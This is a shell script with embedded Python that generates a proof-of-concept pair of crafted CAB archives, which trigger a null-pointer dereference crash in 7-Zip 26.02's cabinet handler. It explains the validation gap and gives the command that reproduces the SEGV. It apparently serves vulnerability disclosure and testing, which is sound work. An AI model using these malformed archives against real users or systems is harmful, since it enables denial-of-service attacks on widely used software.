#!/usr/bin/env bash
# Regenerate the PoC cabinet pair (7-Zip 26.02 CAB folder-index null dereference).
# Fully synthetic and deterministic: both cabinets are assembled from scratch.
# Requires: python3.
#
# Usage: ./make-poc-image.sh [outdir]
set -euo pipefail
OUT="${1:-.}"

python3 - "$OUT" <<'PY'
import os, struct, sys

# Layout taken from the 26.02 sources, not guessed:
#   CPP/7zip/Archive/Cab/CabIn.cpp  CInArcInfo::Parse()     -> 32-byte header
#   CPP/7zip/Archive/Cab/CabIn.cpp  CInArchive::ReadDatabase() -> folders, files
#   CPP/7zip/Archive/Cab/CabHeader.h NFolderIndex            -> the three specials
MARKER = b"MSCF"
F_PREV, F_NEXT = 1, 2
CONT_TO_NEXT = 0xFFFE          # NFolderIndex::kContinuedToNext

def cab(num_folders, files, flags, set_id, cab_num,
        prev=None, nxt=None, folder_blocks=1, data=b""):
    body = struct.pack("<HH", set_id, cab_num)
    if flags & F_PREV:
        body += prev[0].encode() + b"\0" + prev[1].encode() + b"\0"
    if flags & F_NEXT:
        body += nxt[0].encode() + b"\0" + nxt[1].encode() + b"\0"

    folders_off = 32 + len(body)
    files_off = folders_off + 8 * num_folders
    file_tab = b""
    for (size, off, ifolder, name) in files:
        file_tab += struct.pack("<IIHHHH", size, off, ifolder, 0x1234, 0x5678, 0x20)
        file_tab += name.encode() + b"\0"
    data_off = files_off + len(file_tab)

    folders = b""
    for _ in range(num_folders):
        # coffCabStart, cCFData, typeCompress major/minor (0 = stored)
        folders += struct.pack("<IHBB", data_off, folder_blocks, 0, 0)

    hdr = bytearray(32)
    hdr[0:4] = MARKER
    struct.pack_into("<I", hdr, 8, data_off + len(data))   # cbCabinet
    struct.pack_into("<I", hdr, 0x10, files_off)           # coffFiles
    hdr[0x18] = 3                                          # versionMinor
    hdr[0x19] = 1                                          # versionMajor
    struct.pack_into("<H", hdr, 0x1A, num_folders)
    struct.pack_into("<H", hdr, 0x1C, len(files))
    struct.pack_into("<H", hdr, 0x1E, flags)
    return bytes(hdr) + body + folders + file_tab + data

def cfdata(payload):
    # csum, cbData, cbUncomp  (stored, so the checksum is not verified)
    return struct.pack("<IHH", 0, len(payload), len(payload)) + payload

outdir = sys.argv[1]
payload = b"A" * 32

# Cabinet 1: one folder, one file marked "continues into the next cabinet", and
# a NEXT_CABINET pointer.  GetFolderIndex() returns numFolders-1 = 0, so the
# item passes 26.02's upper-bound-only validation.
v1 = cab(num_folders=1,
         files=[(len(payload) * 2, 0, CONT_TO_NEXT, "x.bin")],
         flags=F_NEXT, set_id=0x1111, cab_num=0,
         nxt=("poc2.cab", ""), folder_blocks=1, data=cfdata(payload))

# Cabinet 2: ZERO folders and ZERO files.  Nothing in 26.02's parse path
# rejects that, so Volumes[1].Folders stays empty -- and CRecordVector's
# backing pointer for an empty vector is NULL.
v2 = cab(num_folders=0, files=[], flags=F_PREV, set_id=0x1111, cab_num=1,
         prev=("poc.cab", ""))

p1 = os.path.join(outdir, "poc.cab")
p2 = os.path.join(outdir, "poc2.cab")
open(p1, "wb").write(v1)
open(p2, "wb").write(v2)
print("wrote %s (%d bytes) and %s (%d bytes)" % (p1, len(v1), p2, len(v2)))
PY

echo "run: <7zz-26.02-asan> x poc.cab -o/tmp/x -y   # -> SEGV on the zero page in CabHandler.cpp"
